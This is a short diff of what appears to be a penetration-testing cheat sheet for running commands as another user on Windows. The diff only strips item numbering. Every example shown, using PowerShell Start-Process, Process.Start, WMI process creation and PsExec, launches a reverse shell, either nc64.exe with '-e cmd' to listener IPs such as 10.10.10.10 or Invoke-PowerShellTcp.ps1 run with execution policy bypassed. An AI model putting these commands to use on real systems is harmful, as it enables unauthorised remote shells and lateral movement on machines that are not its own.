@@ -1,31 +1,28 @@
 POWERSHELL
 -------------------------------------
-1. 
 $pass = ConvertTo-SecureString "pass" -AsPlainText -Force
 $mycreds = New-Object System.Management.Automation.PSCredential ("username", $pass)
 $computer = "hostname"
 [System.Diagnostics.Process]::Start("c:\nc64.exe","10.10.10.10 4567 -e cmd",$mycreds.Username, $mycreds.Password, $computer)
 
-2.
+
 $pass = ConvertTo-SecureString "pass" -AsPlainText -Force
 $mycreds = New-Object System.Management.Automation.PSCredential ("username", $pass)
 start-process -Credential $mycreds c:\users\"daniel lopez"\desktop\nc64.exe -argumentlist "10.10.10.10 4567 -e cmd"
 
-3.
+
 $pass = ConvertTo-SecureString "pass" -AsPlainText -Force
 $mycreds = New-Object System.Management.Automation.PSCredential ("username", $pass)
 invoke-wmimethod win32_process -name create -Credential $mycreds -argumentlist 'nc64.exe 10.10.13.6 9090 -e cmd'
 
-4.
+
 EMPIRE --> spawnas
 
 
 PsExec (PStools microsoft)
 -----------------------------------
-1.
 ./PsExec64.exe -accepteula -u user -p pass cmd /c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -File "C:\Tools\Invoke-PowerShellTcp.ps1"
 
-2.
 PsExec64.exe -accepteula -u attl4s -p pass cmd /k C:\users\attl4s\desktop\nc64.exe 192.168.1.50 4567
 
 
